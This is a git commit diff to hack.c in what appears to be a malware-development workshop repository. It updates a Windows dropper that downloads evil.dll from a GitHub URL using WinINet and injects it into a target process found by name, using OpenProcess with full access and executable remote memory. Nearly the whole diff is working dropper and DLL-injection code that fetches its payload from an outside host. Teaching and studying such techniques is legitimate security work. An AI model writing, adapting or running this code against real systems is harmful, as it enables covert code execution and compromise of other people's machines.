57122d50f076e2aafbe85a2d8103b5c0af5f82f0
cocomelonc <cocomelonkz@gmail.com>
2025-04-20 08:41:45 +0300

    test dropper: update link

--- 03-injection/03-dropper/hack.c
+++ 03-injection/03-dropper/hack.c
@@ -14,10 +14,45 @@ author: @cocomelonc
 char evilDLL[] = "C:\\Temp\\evil.dll";
 unsigned int evilLen = sizeof(evilDLL) + 1;
 
+// find process ID by process name
+int findMyProc(const char *procname) {
+
+  HANDLE hSnapshot;
+  PROCESSENTRY32 pe;
+  int pid = 0;
+  BOOL hResult;
+
+  // snapshot of all processes in the system
+  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+  // initializing size: needed for using Process32First
+  pe.dwSize = sizeof(PROCESSENTRY32);
+
+  // info about first process encountered in a system snapshot
+  hResult = Process32First(hSnapshot, &pe);
+
+  // retrieve information about the processes
+  // and exit if unsuccessful
+  while (hResult) {
+    // if we find the process: return process ID
+    if (strcmp(procname, pe.szExeFile) == 0) {
+      pid = pe.th32ProcessID;
+      break;
+    }
+    hResult = Process32Next(hSnapshot, &pe);
+  }
+
+  // closes an open handle (CreateToolhelp32Snapshot)
+  CloseHandle(hSnapshot);
+  return pid;
+}
+
+
 // download evil.dll from url
 char* getEvil() {
   HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)"https://github.com/cocomelonc/meow/raw/refs/heads/master/2022-04-13-malware-injection-19/evil.dll", 0, 0, 0, 0);
+  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)"https://github.com/cocomelonc/bsprishtina-2024-maldev-workshop/raw/refs/heads/main/03-injection/03-dropper/evil.dll", 0, 0, 0, 0);
   DWORD dwFileSize = 1024;
   char* buffer = new char[dwFileSize + 1];
   DWORD dwBytesRead;
@@ -40,6 +75,7 @@ char* getEvil() {
 
 // classic DLL injection logic
 int main(int argc, char* argv[]) {
+  int pid = 0;
   HANDLE ph; // process handle
   HANDLE rt; // remote thread
   LPVOID rb; // remote buffer
@@ -50,12 +86,21 @@ int main(int argc, char* argv[]) {
   char* evil = getEvil();
 
   // parse process ID
-  if ( atoi(argv[1]) == 0) {
+//   if ( atoi(argv[1]) == 0) {
+//     printf("PID not found :( exiting...\n");
+//     return -1;
+//   }
+//   printf("PID: %i\n", atoi(argv[1]));
+
+  pid = findMyProc(argv[1]);
+  if (pid == 0) {
     printf("PID not found :( exiting...\n");
     return -1;
+  } else {
+    printf("PID = %d\n", pid);
   }
-  printf("PID: %i\n", atoi(argv[1]));
-  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
 
   // allocate memory buffer for remote process
   rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
